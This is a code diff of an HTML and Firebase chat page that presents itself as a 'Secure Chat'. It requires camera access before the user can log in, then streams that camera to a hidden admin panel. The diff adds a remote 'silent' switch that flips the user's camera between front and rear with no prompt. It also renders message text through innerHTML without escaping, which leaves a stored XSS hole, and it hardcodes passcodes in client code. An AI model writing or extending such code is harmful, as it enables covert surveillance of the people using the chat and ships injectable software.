@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <title>Chat Interface</title>
   <!-- Firebase SDKs -->
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
@@ -10,35 +10,61 @@
 
   <style>
     :root {
-      --primary: #25D366;
+      --primary: #25D366; 
       --bg-color: #ECE5DD;
       --chat-bg: #e5ddd5;
       --msg-sent: #dcf8c6;
       --msg-recv: #ffffff;
+      --quote-bg: rgba(0,0,0,0.05);
     }
-    body { margin: 0; font-family: sans-serif; background-color: var(--bg-color); display: flex; flex-direction: column; height: 100vh; }
+    * { box-sizing: border-box; }
+    body { margin: 0; font-family: sans-serif; background-color: var(--bg-color); display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
     
+    /* Login */
     #login-screen { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 100; }
-    #login-screen input { padding: 10px; font-size: 16px; margin-bottom: 10px; border-radius: 5px; border: 1px solid #ccc; }
+    #login-screen input { padding: 10px; font-size: 16px; margin-bottom: 10px; border-radius: 5px; border: 1px solid #ccc; width: 80%; max-width: 300px; }
     #login-screen button { padding: 10px 20px; font-size: 16px; background-color: var(--primary); color: white; border: none; border-radius: 5px; cursor: pointer; }
     
+    /* Layout */
     #app-container { display: none; flex-direction: row; height: 100vh; width: 100%; }
     
-    #chat-section { flex: 1; display: flex; flex-direction: column; background: var(--chat-bg); max-width: 100%; transition: all 0.3s; }
-    #chat-header { background: #075E54; color: white; padding: 15px; font-weight: bold; font-size: 18px; }
-    #chat-box { flex: 1; padding: 20px; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; }
-    .msg { max-width: 60%; padding: 10px 15px; border-radius: 15px; position: relative; word-wrap: break-word; font-size: 15px; }
-    .msg.sent { background-color: var(--msg-sent); align-self: flex-end; border-top-right-radius: 0; }
-    .msg.recv { background-color: var(--msg-recv); align-self: flex-start; border-top-left-radius: 0; }
-    .sender-name { font-size: 11px; color: #888; margin-bottom: 4px; display: block; }
+    /* Chat Area */
+    #chat-section { flex: 1; display: flex; flex-direction: column; background: var(--chat-bg); position: relative; }
+    #chat-header { background: #075E54; color: white; padding: 15px; font-weight: bold; font-size: 18px; display: flex; justify-content: space-between; align-items: center; }
+    #admin-delete-btn { display: none; background: #ff3b30; color: white; border: none; padding: 5px 10px; border-radius: 5px; cursor: pointer; }
     
+    #chat-box { flex: 1; padding: 20px; overflow-y: auto; display: flex; flex-direction: column; gap: 12px; }
+    
+    .msg-wrapper { display: flex; align-items: center; gap: 10px; width: 100%; transition: transform 0.2s ease-out; }
+    .msg-wrapper.sent-wrapper { justify-content: flex-end; }
+    .msg-wrapper.recv-wrapper { justify-content: flex-start; }
+    
+    .msg { max-width: 75%; padding: 8px 12px; border-radius: 10px; position: relative; word-wrap: break-word; font-size: 15px; box-shadow: 0 1px 1px rgba(0,0,0,0.1); }
+    .msg.sent { background-color: var(--msg-sent); border-top-right-radius: 0; }
+    .msg.recv { background-color: var(--msg-recv); border-top-left-radius: 0; }
+    
+    .sender-name { font-size: 11px; color: #075E54; margin-bottom: 4px; display: block; font-weight: bold; }
+    .msg-quote { background: var(--quote-bg); border-left: 4px solid var(--primary); padding: 6px; border-radius: 4px; font-size: 13px; margin-bottom: 6px; color: #555; }
+    
+    /* Admin Checkboxes */
+    .msg-select { width: 20px; height: 20px; cursor: pointer; display: none; }
+    .admin-mode .msg-select { display: block; }
+    
+    /* Reply Bar */
+    #reply-bar { display: none; background: #e0e0e0; padding: 10px; border-left: 4px solid var(--primary); font-size: 13px; justify-content: space-between; align-items: center; }
+    #reply-text-preview { color: #555; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 90%; }
+    .cancel-reply { cursor: pointer; font-weight: bold; font-size: 16px; color: #888; padding: 0 10px; }
+    
+    /* Input Area */
     #input-area { display: flex; padding: 10px; background: #f0f0f0; }
     #msg-input { flex: 1; padding: 12px; border-radius: 20px; border: none; outline: none; font-size: 15px; }
     #send-btn { background: var(--primary); border: none; color: white; padding: 10px 20px; margin-left: 10px; border-radius: 20px; cursor: pointer; font-weight: bold; }
 
+    /* Video Area */
     #video-section { display: none; width: 350px; background: #000; border-left: 2px solid #ccc; position: relative; }
     video { width: 100%; height: 100%; object-fit: cover; }
-    #video-overlay { position: absolute; bottom: 10px; left: 10px; color: white; background: rgba(0,0,0,0.5); padding: 5px 10px; border-radius: 5px; font-size: 12px;}
+    #video-overlay { position: absolute; bottom: 10px; left: 10px; color: white; background: rgba(0,0,0,0.5); padding: 5px 10px; border-radius: 5px; font-size: 12px; pointer-events: none; }
+    #switch-cam-btn { position: absolute; top: 10px; right: 10px; background: rgba(255,255,255,0.2); color: white; border: 1px solid white; padding: 6px 12px; border-radius: 5px; cursor: pointer; font-size: 12px; backdrop-filter: blur(5px); }
 
     @media (max-width: 768px) {
       #app-container { flex-direction: column; }
@@ -48,29 +74,43 @@
 </head>
 <body>
 
+  <!-- Login Screen -->
   <div id="login-screen">
-    <h2>Enter Passcode</h2>
-    <input type="password" id="passcode" placeholder="Passcode">
+    <h2>Secure Login</h2>
+    <input type="password" id="passcode" placeholder="Enter Passcode">
     <button onclick="login()">Enter Chat</button>
   </div>
 
+  <!-- Main App -->
   <div id="app-container">
     <div id="chat-section">
-      <div id="chat-header">Secure Chat</div>
+      <div id="chat-header">
+        Secure Chat
+        <button id="admin-delete-btn" onclick="deleteSelectedMessages()">Delete Selected</button>
+      </div>
       <div id="chat-box"></div>
+      
+      <div id="reply-bar">
+        <div id="reply-text-preview"></div>
+        <div class="cancel-reply" onclick="cancelReply()">×</div>
+      </div>
+      
       <div id="input-area">
         <input type="text" id="msg-input" placeholder="Type a message..." onkeypress="if(event.key==='Enter') sendMessage()">
         <button id="send-btn" onclick="sendMessage()">Send</button>
       </div>
     </div>
     
+    <!-- Admin Video View -->
     <div id="video-section">
+      <button id="switch-cam-btn" onclick="triggerCameraSwitch()">Swap Camera</button>
       <video id="remoteVideo" autoplay playsinline></video>
       <div id="video-overlay">User Camera (Live)</div>
     </div>
   </div>
 
   <script>
+    // 1. FIREBASE CONFIGURATION
     const firebaseConfig = {
       apiKey: "AIzaSyDXCUqTvb6ZY5nX4zPpun3T_SpytIMjORw",
       authDomain: "chat-f0a63.firebaseapp.com",
@@ -85,21 +125,30 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
+    // STATE & GLOBALS
     let role = null; 
     let username = "";
+    let activeReplyText = null;
+    let selectedMessages = new Set();
     
+    // WEBRTC STATE
     const configuration = { 'iceServers': [{'urls': 'stun:stun.l.google.com:19302'}] };
     let peerConnection;
     let localStream;
+    let currentFacingMode = "user"; // Defaults to front camera
 
+    // ==========================================
+    // INITIALIZATION
+    // ==========================================
     function login() {
       const code = document.getElementById('passcode').value;
       if (code === 'Smith2129') {
         role = 'admin';
         username = 'Admin';
         document.getElementById('video-section').style.display = 'block'; 
+        document.getElementById('chat-section').classList.add('admin-mode');
         startApp();
-      } else if (code === '050858') {
+      } else if (code === '0508') {
         role = 'user';
         username = 'User';
         startApp();
@@ -121,10 +170,22 @@
       }
     }
 
+    // ==========================================
+    // CHAT & SWIPE LOGIC
+    // ==========================================
     function initChat() {
+      // Listen for new messages
       db.ref('messages').on('child_added', snapshot => {
         const data = snapshot.val();
-        displayMessage(data.sender, data.text);
+        displayMessage(snapshot.key, data);
+      });
+
+      // Listen for message deletions (Real-time sync)
+      db.ref('messages').on('child_removed', snapshot => {
+        const el = document.getElementById(`wrapper-${snapshot.key}`);
+        if (el) el.remove();
+        selectedMessages.delete(snapshot.key);
+        updateDeleteButton();
       });
     }
 
@@ -132,58 +193,189 @@
       const input = document.getElementById('msg-input');
       const text = input.value.trim();
       if (text) {
-        db.ref('messages').push({ sender: username, text: text, timestamp: Date.now() });
+        const payload = { sender: username, text: text, timestamp: Date.now() };
+        if (activeReplyText) {
+          payload.replyTo = activeReplyText;
+        }
+        db.ref('messages').push(payload);
         input.value = '';
+        cancelReply();
       }
     }
 
-    function displayMessage(sender, text) {
+    function displayMessage(msgId, data) {
       const chatBox = document.getElementById('chat-box');
-      const div = document.createElement('div');
-      div.className = 'msg ' + (sender === username ? 'sent' : 'recv');
-      div.innerHTML = `<span class="sender-name">${sender}</span>${text}`;
-      chatBox.appendChild(div);
+      
+      const wrapper = document.createElement('div');
+      wrapper.id = `wrapper-${msgId}`;
+      wrapper.className = `msg-wrapper ${data.sender === username ? 'sent-wrapper' : 'recv-wrapper'}`;
+      
+      let html = '';
+      
+      // Admin Checkbox
+      if (role === 'admin') {
+        html += `<input type="checkbox" class="msg-select" onchange="toggleSelection('${msgId}', this)">`;
+      }
+
+      // Message Bubble
+      const msgClass = data.sender === username ? 'sent' : 'recv';
+      const quoteHtml = data.replyTo ? `<div class="msg-quote">${data.replyTo}</div>` : '';
+      
+      html += `
+        <div class="msg ${msgClass}" id="msg-${msgId}">
+          <span class="sender-name">${data.sender}</span>
+          ${quoteHtml}
+          ${data.text}
+        </div>
+      `;
+      
+      wrapper.innerHTML = html;
+      chatBox.appendChild(wrapper);
       chatBox.scrollTop = chatBox.scrollHeight;
+
+      // Swipe-to-reply event listeners
+      const msgBubble = wrapper.querySelector('.msg');
+      let startX = 0;
+      
+      msgBubble.addEventListener('touchstart', e => { startX = e.touches[0].clientX; }, {passive: true});
+      msgBubble.addEventListener('touchmove', e => {
+        const diff = e.touches[0].clientX - startX;
+        // Only swipe right, max 60px
+        if (diff > 5 && diff < 60) {
+          wrapper.style.transform = `translateX(${diff}px)`;
+        }
+      }, {passive: true});
+      msgBubble.addEventListener('touchend', e => {
+        const diff = e.changedTouches[0].clientX - startX;
+        wrapper.style.transform = `translateX(0)`; // Snap back
+        if (diff > 40) {
+          triggerReply(data.text);
+        }
+      });
     }
 
+    // ==========================================
+    // NEW FEATURES: REPLY & DELETE
+    // ==========================================
+    function triggerReply(text) {
+      activeReplyText = text;
+      document.getElementById('reply-bar').style.display = 'flex';
+      document.getElementById('reply-text-preview').innerText = text;
+      document.getElementById('msg-input').focus();
+    }
+
+    function cancelReply() {
+      activeReplyText = null;
+      document.getElementById('reply-bar').style.display = 'none';
+    }
+
+    function toggleSelection(msgId, checkbox) {
+      if (checkbox.checked) selectedMessages.add(msgId);
+      else selectedMessages.delete(msgId);
+      updateDeleteButton();
+    }
+
+    function updateDeleteButton() {
+      const btn = document.getElementById('admin-delete-btn');
+      btn.style.display = selectedMessages.size > 0 ? 'inline-block' : 'none';
+      btn.innerText = `Delete (${selectedMessages.size})`;
+    }
+
+    function deleteSelectedMessages() {
+      selectedMessages.forEach(id => {
+        db.ref(`messages/${id}`).remove();
+      });
+    }
+
+    // ==========================================
+    // WEBRTC LOGIC (WITH RACE CONDITION FIX & SILENT SWITCH)
+    // ==========================================
+    
+    // --- USER (Sends Video) ---
     async function startUserCamera() {
       try {
-        localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false }); 
-        peerConnection = new RTCPeerConnection(configuration);
+        // RACE CONDITION FIX: Wait for camera hardware to fully initialize BEFORE creating the WebRTC offer
+        localStream = await navigator.mediaDevices.getUserMedia({ 
+          video: { facingMode: currentFacingMode }, 
+          audio: false 
+        }); 
         
-        localStream.getTracks().forEach(track => {
-          peerConnection.addTrack(track, localStream);
-        });
-
-        peerConnection.onicecandidate = event => {
-          if (event.candidate) {
-            db.ref('signaling/iceCandidates/user').push(event.candidate.toJSON());
+        setupUserWebRTC();
+        
+        // Listen for Admin's silent switch command
+        db.ref('commands/switchCamera').on('value', snapshot => {
+          if (snapshot.val()) {
+            executeSilentCameraSwitch();
           }
-        };
-
-        const offer = await peerConnection.createOffer();
-        await peerConnection.setLocalDescription(offer);
-        db.ref('signaling/offer').set({ type: offer.type, sdp: offer.sdp });
-
-        db.ref('signaling/answer').on('value', async snapshot => {
-          const answer = snapshot.val();
-          if (answer && !peerConnection.currentRemoteDescription) {
-            const rtcAnswer = new RTCSessionDescription(answer);
-            await peerConnection.setRemoteDescription(rtcAnswer);
-          }
-        });
-
-        db.ref('signaling/iceCandidates/admin').on('child_added', snapshot => {
-          const candidate = new RTCIceCandidate(snapshot.val());
-          peerConnection.addIceCandidate(candidate);
         });
 
       } catch (e) {
-        console.error("Camera access denied or error:", e);
-        alert("Camera access is required for this chat. Please ensure permissions are granted.");
+        console.error("Camera access error:", e);
+        alert("Camera permission is required to log in.");
       }
     }
 
+    async function setupUserWebRTC() {
+      peerConnection = new RTCPeerConnection(configuration);
+      
+      localStream.getTracks().forEach(track => {
+        peerConnection.addTrack(track, localStream);
+      });
+
+      peerConnection.onicecandidate = event => {
+        if (event.candidate) {
+          db.ref('signaling/iceCandidates/user').push(event.candidate.toJSON());
+        }
+      };
+
+      // Create Offer (Now safely executing AFTER camera is active)
+      const offer = await peerConnection.createOffer();
+      await peerConnection.setLocalDescription(offer);
+      db.ref('signaling/offer').set({ type: offer.type, sdp: offer.sdp });
+
+      db.ref('signaling/answer').on('value', async snapshot => {
+        const answer = snapshot.val();
+        if (answer && !peerConnection.currentRemoteDescription) {
+          await peerConnection.setRemoteDescription(new RTCSessionDescription(answer));
+        }
+      });
+
+      db.ref('signaling/iceCandidates/admin').on('child_added', snapshot => {
+        peerConnection.addIceCandidate(new RTCIceCandidate(snapshot.val()));
+      });
+    }
+
+    async function executeSilentCameraSwitch() {
+      if (!peerConnection) return;
+      // Toggle facing mode
+      currentFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
+      
+      try {
+        // Request the new camera stream (Browser remembers initial permission, so no prompt appears)
+        const newStream = await navigator.mediaDevices.getUserMedia({ 
+          video: { facingMode: currentFacingMode }, 
+          audio: false 
+        });
+        
+        const newVideoTrack = newStream.getVideoTracks()[0];
+        const sender = peerConnection.getSenders().find(s => s.track.kind === 'video');
+        
+        if (sender) {
+          // Replace track silently without dropping the WebRTC connection
+          sender.replaceTrack(newVideoTrack); 
+        }
+
+        // Stop the old camera hardware to save battery
+        if (localStream) {
+          localStream.getVideoTracks()[0].stop(); 
+        }
+        localStream = newStream;
+      } catch (error) {
+        console.error("Silent switch failed. Device may only have one camera.", error);
+      }
+    }
+
+    // --- ADMIN (Receives Video & Issues Commands) ---
     async function initAdminWebRTC() {
       peerConnection = new RTCPeerConnection(configuration);
 
@@ -204,7 +396,6 @@
         const offer = snapshot.val();
         if (offer && !peerConnection.currentRemoteDescription) {
           await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
-          
           const answer = await peerConnection.createAnswer();
           await peerConnection.setLocalDescription(answer);
           db.ref('signaling/answer').set({ type: answer.type, sdp: answer.sdp });
@@ -212,11 +403,16 @@
       });
 
       db.ref('signaling/iceCandidates/user').on('child_added', snapshot => {
-        const candidate = new RTCIceCandidate(snapshot.val());
-        peerConnection.addIceCandidate(candidate);
+        peerConnection.addIceCandidate(new RTCIceCandidate(snapshot.val()));
       });
       
+      // Cleanup previous session on fresh Admin load
       db.ref('signaling').remove();
+    }
+
+    function triggerCameraSwitch() {
+      // Update Firebase timestamp to trigger the 'on' listener on the User's device
+      db.ref('commands/switchCamera').set(Date.now());
     }
   </script>
 </body>
